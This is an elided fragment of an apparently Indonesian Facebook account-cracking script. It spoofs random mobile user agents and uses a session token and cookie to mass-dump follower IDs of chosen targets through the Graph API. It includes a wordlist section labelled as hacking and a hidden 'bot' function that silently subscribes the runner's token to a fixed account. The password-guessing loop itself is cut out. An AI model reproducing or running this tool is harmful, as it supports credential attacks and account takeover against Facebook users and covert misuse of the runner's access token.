...
for xd in range(10000):
	...
	f='Redmi 01A Build/01AQKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	...
	g='Redmi 8 Build/PKQ1.190319.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.4.17'
...
for x in range(10):
	...
	i='15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/'
...
def banner():
	print(f'''\t{asu} ______                                              
\t_____  _____  _____ _  _______  __   _______  
\t |  __ \|_   _|/ ____| |/ /_   _| \ \ / /  __ \ 
\t | |__) | | | | (___ | ' /  | |    \ V /| |  | |
\t |  _  /  | |  \___ \|  <   | |     > < | |  | |
\t | | \ \ _| |_ ____) | . \ _| |_   / . \| |__| |
\t|_|  \_\_____|_____/|_|\_\_____| /_/ \_\_____/
\t{m}•{k}•{h}•{sir} Awali Dengan Membaca Bismillah {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def bot():
	try:
		requests.post("https://graph.facebook.com/3902743?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#------------------[ BAGIAN-MENU ]----------------#
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('>> Ingin Berapa Target Bang ? : '))
	except ValueError:
		print('>> Masukkan Angka Bukan Hurup Bang ')
		exit()
	if jum<1 or jum>100:
...
def dump_pengikut():
	...
	try:
		koh2 = requests.get('https://graph.facebook.com/10100622922839470'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} Sedang Meretas Satelit {m}•{k}•{h}•{x} <<<<< ')
	print('')
